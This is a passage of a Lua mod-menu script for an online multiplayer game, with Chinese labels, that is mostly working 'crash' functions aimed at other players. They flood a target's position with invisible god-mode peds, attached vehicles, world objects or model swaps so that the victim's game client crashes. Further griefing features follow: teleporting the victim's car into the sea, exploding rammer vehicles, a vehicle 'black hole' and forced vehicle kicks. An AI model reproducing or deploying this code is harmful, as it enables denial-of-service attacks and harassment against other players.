		ui.notify_above_map("目标坐标异常稍后再试", "", 140)
		entity.set_entity_coords_no_offset(pedmy,mypos)
		return
		end
		end
		end
		system.wait(1)
		ppos.x = ppos.x + 2000
		ppos.z = ppos.z + 4000
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),ppos)
		entity.freeze_entity(player.get_player_ped(player.player_id()), true)
		system.wait(100)
		pos = v3(-75.392,-819.270,326.175)
		wade1 = Cped(26, 0x9B22DBAF,pos , 0)
		entity.set_entity_god_mode(wade1, true)
		entity.freeze_entity(wade1, true)
		for i = 1 , 100 do
		ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
		invalidpeda2 = Cped(i, 0x9B22DBAF,pos , 0)
		entity.set_entity_god_mode(invalidpeda2, true)
		entity.freeze_entity(invalidpeda2, true)
		entity.attach_entity_to_entity(invalidpeda2, wade1, 0, v3(0,0,0), v3(0,0,0), true, false, false, 0, true)
		system.wait(1)
		end
		system.wait(1000)
		for j = 0, 150 do
		local ppos = player.get_player_coords(pid)
		local headpid = player.get_player_heading(pid)
		local headpid = math.rad((headpid - 180) * -1)
		ppos.x = ppos.x + math.sin(headpid) * -5
		ppos.y = ppos.y + math.cos(headpid) * -5
		ppos.z = ZPOS
		entity.set_entity_coords_no_offset(wade1,ppos)
		end
		system.wait(10000)
		entity.detach_entity(wade1)
		system.wait(300)
		allpeds = ped.get_all_peds()
		for i = 1, #allpeds  do
		pedhash = entity.get_entity_model_hash(allpeds[i])
		if pedhash == 0x9B22DBAF then
		entity.delete_entity(allpeds[i])
		end
		end
		ui.notify_above_map("崩溃数据清除完毕", "", 140)
		entity.freeze_entity(player.get_player_ped(player.player_id()), false)
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),mypos)
		elseif f.value == 1 then
		mypos = player.get_player_coords(player.player_id())
		playerpos = player.get_player_coords(pid)
		pedmy = player.get_player_ped(player.player_id())
		ZPOS = playerpos.z
		if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
		local L_time = 0
		while true do
		entity.set_entity_coords_no_offset(pedmy,playerpos)
		system.wait(50)
		local playerpos_no = player.get_player_coords(pid)
		if playerpos_no.z ~= -50.0 then
		ZPOS = playerpos_no.z
		entity.set_entity_coords_no_offset(pedmy,mypos)
		break
		end
		L_time = L_time + 1
		if L_time > 100 then
		ui.notify_above_map("目标坐标异常稍后再试", "", 140)
		entity.set_entity_coords_no_offset(pedmy,mypos)
		return
		end
		end
		end
		system.wait(100)
		pos = v3(-75.392,-819.270,326.175)
		ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
		wade1 = Cped(26, 0x9B22DBAF,pos , 0)
		entity.set_entity_god_mode(wade1, true)
		entity.freeze_entity(wade1, true)
		for i = 1 , 100 do
		ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
		invalidpeda2 = Cped(i, 0x9B22DBAF,pos , 0)
		entity.set_entity_god_mode(invalidpeda2, true)
		entity.freeze_entity(invalidpeda2, true)
		entity.attach_entity_to_entity(invalidpeda2, wade1, 0, v3(0,0,0), v3(0,0,0), true, false, false, 0, true)
		system.wait(1)
		end
		system.wait(1000)
		for j = 0, 150 do
		local ppos = player.get_player_coords(pid)
		local headpid = player.get_player_heading(pid)
		local headpid = math.rad((headpid - 180) * -1)
		ppos.x = ppos.x + math.sin(headpid) * -5
		ppos.y = ppos.y + math.cos(headpid) * -5
		ppos.z = ZPOS
		entity.set_entity_coords_no_offset(wade1,ppos)
		end
		system.wait(10000)
		entity.detach_entity(wade1)
		system.wait(300)
		allpeds = ped.get_all_peds()
		for i = 1, #allpeds  do
		pedhash = entity.get_entity_model_hash(allpeds[i])
		if pedhash == 0x9B22DBAF then
		entity.delete_entity(allpeds[i])
		end
		end
	    ui.notify_above_map("崩溃数据清除完毕", "", 140)
		end
		end):set_str_data({
		"自动远离",
		"手动远离"
		})

WEIDECRASH = menu.add_feature("祖国人崩溃", "action_value_str", crashmenu.id, function(f)
		if f.value == 0 then
		mypos = player.get_player_coords(player.player_id())
		playerpos = player.get_player_coords(pid)
		ppos = player.get_player_coords(pid)
		pedmy = player.get_player_ped(player.player_id())
		ZPOS = playerpos.z
		if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
		local L_time = 0
		while true do
		entity.set_entity_coords_no_offset(pedmy,playerpos)
		system.wait(50)
		local playerpos_no = player.get_player_coords(pid)
		if playerpos_no.z ~= -50.0 then
		ZPOS = playerpos_no.z
		entity.set_entity_coords_no_offset(pedmy,mypos)
		break
		end
	    L_time = L_time + 1
		if L_time > 100 then
		ui.notify_above_map("目标坐标异常稍后再试", "", 140)
		entity.set_entity_coords_no_offset(pedmy,mypos)
		return
		end
		end
		end
		system.wait(1)
		ppos.x = ppos.x + 2000
		ppos.z = ppos.z + 4000
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),ppos)
		entity.freeze_entity(player.get_player_ped(player.player_id()), true)
		system.wait(100)
		pos = v3(-75.392,-819.270,326.175)
		wade1 = Cped(26, 225514697,pos , 0)
		entity.set_entity_god_mode(wade1, true)
		entity.freeze_entity(wade1, true)
		for i = 1 , 100 do
		ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
		invalidpeda2 = Cped(i, 225514697,pos , 0)
		entity.set_entity_god_mode(invalidpeda2, true)
		entity.freeze_entity(invalidpeda2, true)
		entity.attach_entity_to_entity(invalidpeda2, wade1, 0, v3(0,0,0), v3(0,0,0), true, false, false, 0, true)
		system.wait(1)
		end
		system.wait(1000)
		for j = 0, 150 do
		local ppos = player.get_player_coords(pid)
		local headpid = player.get_player_heading(pid)
		local headpid = math.rad((headpid - 180) * -1)
		ppos.x = ppos.x + math.sin(headpid) * -5
		ppos.y = ppos.y + math.cos(headpid) * -5
		ppos.z = ZPOS
		entity.set_entity_coords_no_offset(wade1,ppos)
		end
		system.wait(10000)
		entity.detach_entity(wade1)
		system.wait(300)
		allpeds = ped.get_all_peds()
		for i = 1, #allpeds  do
		pedhash = entity.get_entity_model_hash(allpeds[i])
		if pedhash == 225514697 then
		entity.delete_entity(allpeds[i])
		end
		end
		ui.notify_above_map("崩溃数据清除完毕", "", 140)
		entity.freeze_entity(player.get_player_ped(player.player_id()), false)
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),mypos)
		elseif f.value == 1 then
		mypos = player.get_player_coords(player.player_id())
		playerpos = player.get_player_coords(pid)
		pedmy = player.get_player_ped(player.player_id())
		ZPOS = playerpos.z
		if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
		local L_time = 0
		while true do
		entity.set_entity_coords_no_offset(pedmy,playerpos)
		system.wait(50)
		local playerpos_no = player.get_player_coords(pid)
		if playerpos_no.z ~= -50.0 then
		ZPOS = playerpos_no.z
		entity.set_entity_coords_no_offset(pedmy,mypos)
		break
		end
		L_time = L_time + 1
		if L_time > 100 then
		ui.notify_above_map("目标坐标异常稍后再试", "", 140)
		entity.set_entity_coords_no_offset(pedmy,mypos)
		return
		end
		end
		end
		system.wait(100)
		pos = v3(-75.392,-819.270,326.175)
		ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
		wade1 = Cped(26, 225514697,pos , 0)
		entity.set_entity_god_mode(wade1, true)
		entity.freeze_entity(wade1, true)
		for i = 1 , 100 do
		ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
		invalidpeda2 = Cped(i, 225514697,pos , 0)
		entity.set_entity_god_mode(invalidpeda2, true)
		entity.freeze_entity(invalidpeda2, true)
		entity.attach_entity_to_entity(invalidpeda2, wade1, 0, v3(0,0,0), v3(0,0,0), true, false, false, 0, true)
		system.wait(1)
		end
		system.wait(1000)
		for j = 0, 150 do
		local ppos = player.get_player_coords(pid)
		local headpid = player.get_player_heading(pid)
		local headpid = math.rad((headpid - 180) * -1)
		ppos.x = ppos.x + math.sin(headpid) * -5
		ppos.y = ppos.y + math.cos(headpid) * -5
		ppos.z = ZPOS
		entity.set_entity_coords_no_offset(wade1,ppos)
		end
		system.wait(10000)
		entity.detach_entity(wade1)
		system.wait(300)
		allpeds = ped.get_all_peds()
		for i = 1, #allpeds  do
		pedhash = entity.get_entity_model_hash(allpeds[i])
		if pedhash == 225514697 then
		entity.delete_entity(allpeds[i])
		end
		end
	    ui.notify_above_map("崩溃数据清除完毕", "", 140)
		end
		end):set_str_data({
		"自动远离",
		"手动远离"
		})

g = {}
g.input = function(title, lenght, i_type, pre_name)
if not title then
return nil
end
pre_name = pre_name or ''
lenght = lenght or 64
i_type = i_type or 0
local err, i = input.get(title, pre_name, lenght, i_type)
while err == 1 do
system.wait(0)
err, i = input.get(title, pre_name, lenght, i_type)
end
if err == 2 then
return nil
end
return i
end

DDCCRASH = menu.add_feature("超跑崩溃", "action_value_str", crashmenu.id, function(f)
if f.value == 0 then
playerpos = player.get_player_coords(pid)
mypos = player.get_player_coords(player.player_id())
pedmy = player.get_player_ped(player.player_id())
ppos = player.get_player_coords(pid)
ppos.x = ppos.x + 2000
ppos.z = ppos.z + 4000
entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),ppos)
entity.freeze_entity(player.get_player_ped(player.player_id()), true)
system.wait(100)
car = supspawn_vehicle(3602674979,playerpos,0)
for n = 0,70 do
car = supspawn_vehicle(3602674979,playerpos,0)
entity.set_entity_god_mode(car,true)
entity.freeze_entity(car,true)
system.wait(100)
end
system.wait(10000)
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == 3602674979 then
entity.delete_entity(allvehs[i])
system.wait(1)
end
end
entity.freeze_entity(player.get_player_ped(player.player_id()), false)
entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),mypos)
menu.notify("崩溃数据清除完毕", "", 2, RGBAToInt(151, 0, 255, 255))
elseif f.value == 1 then
playerpos = player.get_player_coords(pid)
mypos = player.get_player_coords(player.player_id())
pedmy = player.get_player_ped(player.player_id())
car = supspawn_vehicle(3602674979,playerpos,0)
for n = 0,70 do
car = supspawn_vehicle(3602674979,playerpos,0)
entity.set_entity_god_mode(car,true)
entity.freeze_entity(car,true)
system.wait(100)
end
system.wait(10000)
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == 3602674979 then
entity.delete_entity(allvehs[i])
system.wait(1)
end
end
menu.notify("崩溃数据清除完毕", "", 2, RGBAToInt(151, 0, 255, 255))
end
end):set_str_data({
		"自动远离",
		"需手动远离"
		})
	
req.ctrl = function(e, t)
    if entity.is_an_entity(e) then
        if not network.has_control_of_entity(e) then
            network.request_control_of_entity(e)
            t = t or 25
            local time = utils.time_ms() + t
            while entity.is_an_entity(e) and not network.has_control_of_entity(e) do
                system.wait(0)
                network.request_control_of_entity(e)
                if time < utils.time_ms() then
                    return false
                end
            end
        end
        return network.has_control_of_entity(e)
    end
    return false
end

SHIJIESHITIC = menu.add_feature("实体崩溃", "action_value_str", crashmenu.id, function(f)
			if f.value == 0 then
				playerpos = player.get_player_coords(pid)
				mypos = player.get_player_coords(player.player_id())
				pedmy = player.get_player_ped(player.player_id())
				ZPOS = playerpos.z
				if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
					local L_time = 0
					while true do
					entity.set_entity_coords_no_offset(pedmy,playerpos)
					system.wait(50)
					local playerpos_no = player.get_player_coords(pid)
					if playerpos_no.z ~= -50.0 then
					ZPOS = playerpos_no.z
					entity.set_entity_coords_no_offset(pedmy,mypos)
					break
					end
					L_time = L_time + 1
					if L_time > 100 then
					ui.notify_above_map("目标坐标异常稍后再试", "", 140)
					entity.set_entity_coords_no_offset(pedmy,mypos)
							return
						end
					end
				end
				ppos = player.get_player_coords(pid)
				ppos.x = ppos.x + 2000
				ppos.z = ppos.z + 4000
				entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),ppos)
				entity.freeze_entity(player.get_player_ped(player.player_id()), true)
				system.wait(100)
				for n = 0, 35 do
				object.create_world_object(1096585990, playerpos, true, false)
				object.create_world_object(52002182, playerpos, true, false)
		        object.create_world_object(3370223515, playerpos, true, false)
		        object.create_world_object(3613262246, playerpos, true, false)
		        object.create_world_object(3476535839, playerpos, true, false)
		        object.create_world_object(1003748966, playerpos, true, false)
		        object.create_world_object(1348598835, playerpos, true, false)
		        object.create_world_object(3125611288, playerpos, true, false)
		        object.create_world_object(3613262246, playerpos, true, false)
		        object.create_world_object(0x66F34017, playerpos, true, false)
				object.create_world_object(-2108662770, playerpos, true, false)
				object.create_world_object(0xC4C9551E, playerpos, true, false)
                object.create_world_object(3843358782, playerpos, true, false)
                object.create_world_object(323771564, playerpos, true, false)	
			    object.create_world_object(1096585990, playerpos, true, false)	
                system.wait(100)
				end
				system.wait(10000)
				remove = object.get_all_objects()
				for i = 1, #remove do
				local X = remove[i]
				req.ctrl(X, 250)
				entity.set_entity_velocity(X, v3())
				s_coords(X, v3(8000, 8000, -1000))
				entity.delete_entity(X)
				system.wait(0)
				end
				entity.freeze_entity(player.get_player_ped(player.player_id()), false)
				entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),mypos)
				ui.notify_above_map("清除崩溃数据", "世界实体崩溃", 140)
			    elseif f.value == 1 then
				playerpos = player.get_player_coords(pid)
				mypos = player.get_player_coords(player.player_id())
				pedmy = player.get_player_ped(player.player_id())
				ZPOS = playerpos.z
				if playerpos.z == -50.0 or playerpos.z == -180.0 or playerpos.z == -0.0 then 
				local L_time = 0
				while true do
				entity.set_entity_coords_no_offset(pedmy,playerpos)
				system.wait(50)
				local playerpos_no = player.get_player_coords(pid)
				if playerpos_no.z ~= -50.0 then
				ZPOS = playerpos_no.z
				entity.set_entity_coords_no_offset(pedmy,mypos)
				break
				end
				L_time = L_time + 1
				if L_time > 100 then
				ui.notify_above_map("目标坐标异常稍后再试", "", 140)
				entity.set_entity_coords_no_offset(pedmy,mypos)
				return
				end
				end
				end
				playerpos.z = ZPOS + 0.7
				system.wait(100)
				for n = 0, 35 do
				object.create_world_object(1096585990, playerpos, true, false)
				object.create_world_object(52002182, playerpos, true, false)
		        object.create_world_object(3370223515, playerpos, true, false)
		        object.create_world_object(3613262246, playerpos, true, false)
		        object.create_world_object(3476535839, playerpos, true, false)
		        object.create_world_object(1003748966, playerpos, true, false)
		        object.create_world_object(1348598835, playerpos, true, false)
		        object.create_world_object(3125611288, playerpos, true, false)
		        object.create_world_object(3613262246, playerpos, true, false)
		        object.create_world_object(0x66F34017, playerpos, true, false)
				object.create_world_object(-2108662770, playerpos, true, false)
				object.create_world_object(0xC4C9551E, playerpos, true, false)
                object.create_world_object(3843358782, playerpos, true, false)
                object.create_world_object(323771564, playerpos, true, false)	
                object.create_world_object(1096585990, playerpos, true, false)			
				system.wait(100)
				end
				system.wait(10000)
				remove = object.get_all_objects()
				for i = 1, #remove do
				local X = remove[i]
				req.ctrl(X, 250)
				entity.set_entity_velocity(X, v3())
				s_coords(X, v3(8000, 8000, -1000))
				entity.delete_entity(X)
				system.wait(0)
				end
				ui.notify_above_map("清除崩溃数据", "世界实体崩溃", 140)
			end
		end):set_str_data({
		"自动远离",
		"需手动远离"
		})

menu.add_feature("糖果崩溃", "action_value_str", crashmenu.id, function(f)
	menu.notify("Crashing...", "", 3, RGBAToInt(0, 255, 255, 255))
    if pid ~= player.player_id() then
        for r = 1, 10 do
        request_model(propid[r])
        end
        system.wait(200)
        local crashobj = {}
        local randmnub = math.random(15, 25)
        pedp = player.get_player_ped(pid)
        pedmy = player.get_player_ped(player.player_id())
        mypos = player.get_player_coords(player.player_id())
        ppos = player.get_player_coords(pid)
        ZPOS = ppos.z
        if ppos.z == -50.0 or ppos.z == -180.0 or ppos.z == -0.0 then 
            local L_time = 0
            while true do
                entity.set_entity_coords_no_offset(pedmy,ppos)
                system.wait(50)
                local playerpos_no = player.get_player_coords(pid)
                if playerpos_no.z ~= -50.0 then
                    ZPOS = playerpos_no.z
                    entity.set_entity_coords_no_offset(pedmy,mypos)
                    break
                end
                L_time = L_time + 1
                if L_time > 100 then
                    ui.notify_above_map("目标坐标异常稍后再试", "", 140)
                    pedmy = player.get_player_ped(player.player_id())
                    entity.set_entity_coords_no_offset(pedmy,mypos)
                    return
                end
            end
        end
        system.wait(200)
        for i = 1, randmnub do
            local ppos = v3()
            ppos = player.get_player_coords(pid)
            local random1, random2, random3 = math.random(1, 2), math.random(1, 2), math.random(1, 2)
            ppos.x = ppos.x
            ppos.y = ppos.y
            ppos.z = ZPOS
            if random1 == 1 then
                ppos.x = ppos.x - math.random(5, 10)
            else
                ppos.x = ppos.x + math.random(5, 10)
            end
            if random2 == 1 then
                ppos.y = ppos.y - math.random(5, 10)
            else
                ppos.y = ppos.y + math.random(5, 10)
            end
            if random3 == 1 then
                ppos.z = ppos.z - math.random(5, 10)
            else
                ppos.z = ppos.z + math.random(5, 10)
            end
            if f.value == 0 then
                crashobj[i] = object.create_world_object(1727217687, ppos, true, false)
            else
                crashobj[i] = object.create_world_object(propid[math.random(2, 10)], ppos, true, false)
            end
            system.wait(5)
        end
        system.wait(2000)
        for gay = 1, 5 do
            for i = 1, randmnub do
                entity.set_entity_as_no_longer_needed(crashobj[i])
                entity.delete_entity(crashobj[i])
                system.wait(1)
            end
        end
        system.wait(1000)
        menu.notify("Done", "糖果崩溃", 3, RGBAToInt(0, 255, 255, 255)) 
    end
end):set_str_data({[0] = "普通", [1] = "强劲"})

function supspawn_vehicle(hash, coords, dir, maxed, god)
request_model(hash, 1000)
if maxed then	
entity.set_entity_coords_no_offset(car, coords)
entity.set_entity_heading(car, dir)
if god then
give_godmode(car, true)
end
streaming.set_model_as_no_longer_needed(hash)
return car
else
local car = vehicle.create_vehicle(hash, coords, dir, true, false)
if god then
give_godmode(car, true)
end
streaming.set_model_as_no_longer_needed(hash)
return car
end
end

function QINGCHUVCEN()
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == 0xB12314E0 then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == 0xD6BC7523 then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == 0xE5A2D6C6 then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == 0x9cf21e0f then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == 0xceea3f4b then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == 0xe5a2d6c6 then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == 0x2592b5cf then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == -1323100960 then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == -442313018 then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == -1700801569 then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == 509498602 then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
allvehs = vehicle.get_all_vehicles()
for i = 1, #allvehs  do
vehhash = entity.get_entity_model_hash(allvehs[i])
if vehhash == -823509173 then
entity.delete_entity(allvehs[i])
c.wait(1)
end
end
menu.notify("已清除VC崩溃数据","", 2, RGBAToInt(151, 0, 255, 255))
end

menu.add_feature("世界实体崩溃", "action", crashmenu.id, function()
    entity.freeze_entity(player.get_player_ped(pid), true)
    object.create_world_object(0xC4C9551E, player.get_player_coords(pid), true, false)
    menu.notify("崩溃已经发送 请勿观看玩家", "", 1, RGBAToInt(255, 0, 255))
end)

noly_crashv2 = menu.add_feature("人物模型崩溃","action",crashmenu.id, function()
	if lll then
	notify_above_map("防护型崩溃已启动，该功能无法使用")
	return
	end
	local L = true
	if not autorc.on then
	L = false
	autorc.on = true
	end
	local pos = player.get_player_coords(pid)
	local mypos = player.get_player_coords(player.player_id())
	local myhash = entity.get_entity_model_hash(player.get_player_ped(player.player_id()))
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
	appearance()
	system.wait(500)
	for i = 1,5 do
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
	hashmodel(0x9C9EFFD8)
	system.wait(10)
	ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
	system.wait(100)
	hashmodel(0x705E61F2)
	system.wait(10)
	ped.set_ped_health(player.get_player_ped(player.player_id()), 0)	
	system.wait(200)
	end
	restore(myhash)	
	if not L then
	autorc.on = false
	end
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), mypos)
end)

noly_crashv2 = menu.add_feature("V2崩溃","action",crashmenu.id, function()
	if lll then
	notify_above_map("防护型崩溃已启动，该功能无法使用")
	return
	end
	local L = true
	if not autorc.on then
	L = false
	autorc.on = true
	end
	local pos = player.get_player_coords(pid)
	pos.z = pos.z + 20
	local mypos = player.get_player_coords(player.player_id())
	local myhash = entity.get_entity_model_hash(player.get_player_ped(player.player_id()))
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
	appearance()
	system.wait(500)
	blockfile(pid)
	for i = 0,2 do
	system.wait(5)
	hashmodel(0x705E61F2)
	system.wait(100)
	ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
	system.wait(300)
	hashmodel(0x9C9EFFD8)
	system.wait(100)
	ped.set_ped_health(player.get_player_ped(player.player_id()), 0)
	system.wait(200)
	end
	restore(myhash)	
	if not L then
	autorc.on = false
	end
	entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), mypos)
	system.wait(7000)
	blockfile("-1")
end)

targverC2 = menu.add_feature("VC1-Crash","action",crashmenu.id,function()
playername = player.get_player_name(pid)
pos = player.get_player_coords(pid)
entity.set_entity_coords_no_offset(player.get_player_ped(c.me()),pos)
towtruck = spawn_vehicle(0xB12314E0,pos,0)
entity.set_entity_god_mode(towtruck,true)
entity.set_entity_visible(towtruck,false)
towtruck1 = spawn_vehicle(0xE5A2D6C6,pos,0)
entity.set_entity_god_mode(towtruck1,true)
entity.set_entity_visible(towtruck1,false)
barracks = spawn_vehicle(0xceea3f4b,pos,0)
entity.set_entity_god_mode(barracks,true)
entity.set_entity_visible(barracks,false)
barracks1 = spawn_vehicle(0xceea3f4b,pos,0)
entity.set_entity_god_mode(barracks1,true)
entity.set_entity_visible(barracks1,false)
barracks3 = spawn_vehicle(0x2592b5cf,pos,0)
entity.set_entity_god_mode(barracks3,true)
entity.set_entity_visible(barracks3,false)
barracks31 = spawn_vehicle(0x2592b5cf,pos,0)
entity.set_entity_god_mode(barracks31,true)
entity.set_entity_visible(barracks31,false)
entity.attach_entity_to_entity(towtruck1, towtruck, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(barracks31, towtruck, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(barracks, towtruck, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(barracks1, towtruck, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(barracks3, towtruck, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
ppos = player.get_player_coords(pid)
entity.set_entity_coords_no_offset(towtruck,ppos)
end)

targverC =  menu.add_feature("VC2-Crash","action",crashmenu.id,function()
pos = player.get_player_coords(pid)
entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),pos)
shotaro = spawn_vehicle(0xE7D2A16E,pos,0)
entity.set_entity_god_mode(shotaro,true)
entity.set_entity_visible(shotaro,false)
shotaro1 = spawn_vehicle(0xE7D2A16E,pos,0)
entity.set_entity_god_mode(shotaro1,true)
entity.set_entity_visible(shotaro1,false)
tr4 = spawn_vehicle(0x7CAB34D0,pos,0)
entity.set_entity_god_mode(tr4,true)
entity.set_entity_visible(tr4,false)
tr41 = spawn_vehicle(0x7CAB34D0,pos,0)
entity.set_entity_god_mode(tr41,true)
entity.set_entity_visible(tr41,false)
shotarocar = spawn_vehicle(0xE5A2D6C6,pos,0)
entity.set_entity_god_mode(shotarocar,true)
entity.set_entity_visible(shotarocar,false)
tr4 = spawn_vehicle(0x7CAB34D0,pos,0)
entity.set_entity_god_mode(tr4,true)
entity.set_entity_visible(tr4,false)
tr41 = spawn_vehicle(0x7CAB34D0,pos,0)
entity.set_entity_god_mode(tr41,true)
entity.set_entity_visible(tr41,false)
entity.attach_entity_to_entity(tr4, shotarocar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(tr41, shotarocar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(tr4, shotarocar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(tr41, shotarocar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(shotaro, shotarocar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
entity.attach_entity_to_entity(shotaro1, shotarocar, 0, v3(0,0,0), v3(0,0,0), true, true, false, 0, true)
end)

teleportcarpp = menu.add_feature("传送选项", "parent", playerlist[pid].id,function(feat)
end)

chuansong_player2= menu.add_feature("传送到玩家","action",teleportcarpp.id,function()
pos = player.get_player_coords(pid)
pos.z = pos.z + 2
entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
end)
		
teleportcarp = c.df("传送载具到我","toggle",teleportcarpp.id,function(k)
while k.on do
local car
local pos = v3()		
pos = entity.get_entity_coords(player.get_player_ped(player.player_id()))
pos.x = pos.x + 8
if ped.is_ped_in_any_vehicle(player.get_player_ped(pid)) then
car = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
network.request_control_of_entity(car)
entity.set_entity_coords_no_offset(car, pos)				
end
c.wait(50)
end
k.on = false	
end)


delivery_to_car = menu.add_feature("传送到车里","action",teleportcarpp.id,function()
local pedd = player.get_player_ped(pid)
local pd = player.get_player_ped(player.player_id())
if ped.is_ped_in_any_vehicle(pedd) then
car = ped.get_vehicle_ped_is_using(pedd)
if not vehicle.is_vehicle_full(car) then
notify_above_map("车辆满员")
else
network.request_control_of_entity(car)
ped.set_ped_into_vehicle(pd,car,vehicle.get_free_seat(car))	
end
end
end)

chuansong_player3 = menu.add_feature("传送到玩家附近" , "action", teleportcarpp.id,function()
local pos = player.get_player_coords(pid)
pos.x = pos.x + 5
entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
end)

teleportcardeath = c.df("传送到海里","toggle",teleportcarpp.id,function(k)
while k.on do
local car
local deathpos = v3(-8292.664, -4596.8257, 14358.0)		
if ped.is_ped_in_any_vehicle(player.get_player_ped(pid)) then
car = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
network.request_control_of_entity(car)
entity.set_entity_coords_no_offset(car, deathpos)					
end
c.wait(50)
end
k.on = false	
end)

spoof = menu.add_feature("恶搞选项", "parent", playerlist[pid].id,function(feat)
end)

spoof_kill=menu.add_feature("车辆撞击",'toggle',spoof.id,function(a)
	while a.on do
		system.yield(0)
		local rot=entity.get_entity_rotation(player.get_player_ped(pid))
		rot:transformRotToDir()
		rot=v3(rot.x*3,rot.y*3,rot.z*3)
		if requestmodel(1663218586) then
			spoof_veh_kill=vehicle.create_vehicle(1663218586,player.get_player_coords(pid)-rot,0,true,false)
			entity.set_entity_rotation(spoof_veh_kill,entity.get_entity_rotation(player.get_player_ped(pid)))
			vehicle.set_vehicle_forward_speed(spoof_veh_kill,99999999)
			system.yield(400)
			fire.add_explosion(entity.get_entity_coords(spoof_veh_kill),8,true,true,0,player.get_player_ped(pid))
			system.yield(600)
			entity.delete_entity(spoof_veh_kill)
		end
	end
end)

blackhole = menu.add_feature("死亡黑洞","toggle",spoof.id,function(k)
	while k.on do
		allpeds = vehicle.get_all_vehicles()
		for i = 1,#allpeds do
			pedp  = entity.get_entity_coords(player.get_player_ped(pid))
			get_control_of_entity(allpeds[i], 300)
			entity.set_entity_coords_no_offset(allpeds[i], pedp)
		end
		c.wait(500)
	end
	k.on = false	
end)

menu.add_feature("载具踢出", "toggle", spoof.id, function(playerfeat_toggle)
	while (playerfeat_toggle.on) do
		local player_veh = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
		if (player.is_player_in_any_vehicle(pid)) then
			menu.notify("踢出 " .. player.get_player_name(pid) .. " 从他的 " .. vehicle.get_vehicle_model(player_veh), "",1, RGBAToInt(0, 255, 0))
			ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
		else
